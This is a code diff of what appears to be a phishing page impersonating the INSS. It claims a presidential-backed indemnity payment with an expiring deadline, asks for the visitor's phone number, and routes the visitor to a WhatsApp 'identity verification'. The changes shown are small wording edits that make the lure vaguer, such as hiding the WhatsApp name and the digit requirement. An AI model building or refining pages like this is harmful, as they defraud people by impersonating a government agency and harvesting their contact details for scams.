@@ -341,7 +341,7 @@
         <div class="modal-content">
             <i class="fas fa-exclamation-triangle alert-icon"></i>
             <h2>Aviso Urgente</h2>
-            <p>O INSS acaba de liberar uma <strong>um valor de indenização</strong> a todos os funcionários públicos e privados.</p>
+            <p>O INSS acaba de liberar um <strong>um valor de indenização</strong> a todos os funcionários públicos e privados.</p>
             <span class="highlight-text">
                 Este é um programa de ação social e sanitária, iniciativa do Gabinete do Presidente da República. O prazo para reclamação está a terminar!
             </span>
@@ -437,9 +437,8 @@
             </div>
 
             <div id="payment-details">
-                <p style="margin-bottom: 15px;">Insira o número associado à sua conta <strong id="method-name" style="color: var(--inss-blue);"></strong>.</p>
                 <div class="form-group">
-                    <label>Número de Telefone (9 dígitos)</label>
+                    <label>Digite seu Número:</label>
                     <input type="tel" id="input-telefone" placeholder="Ex: 84 000 0000" maxlength="9" required>
                 </div>
                 <button class="btn-step" onclick="startFinalProcessing()">Receber agora</button>
@@ -466,7 +465,7 @@
             </div>
             <p>Para sua segurança e proteção dos seus dados, precisamos de validar a sua identidade através do nosso atendimento oficial.</p>
             <a href="#" id="whatsapp-link" class="btn-whatsapp" target="_blank">
-                <i class="fab fa-whatsapp" style="font-size: 24px;"></i> Verificar Identidade no WhatsApp
+                <i class="fab fa-whatsapp" style="font-size: 24px;"></i> Verificar Identidade
             </a>
         </div>
 
@@ -607,7 +606,7 @@
             userData.telefone = telefoneInput;
 
             if (!userData.telefone || userData.telefone.length !== 9) {
-                alert("Por favor, insira um número de telefone válido com exatamente 9 dígitos.");
+                alert("Por favor, insira um número de telefone válido.");
                 return;
             }
 
